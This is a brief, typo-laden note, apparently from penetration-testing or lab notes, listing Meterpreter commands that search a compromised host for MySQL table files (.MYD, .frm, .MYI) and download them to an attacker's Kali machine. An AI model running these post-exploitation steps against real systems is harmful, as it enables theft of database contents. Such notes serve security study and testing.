Once we have access to java meter preter the following commands are dun to plxoit the DB

Search -f *.MYD
Search -f *.frm
Search -f *MYI

similarley any files with known extentions/name can be downloaded through java meterpreter window

download filnamename kalipath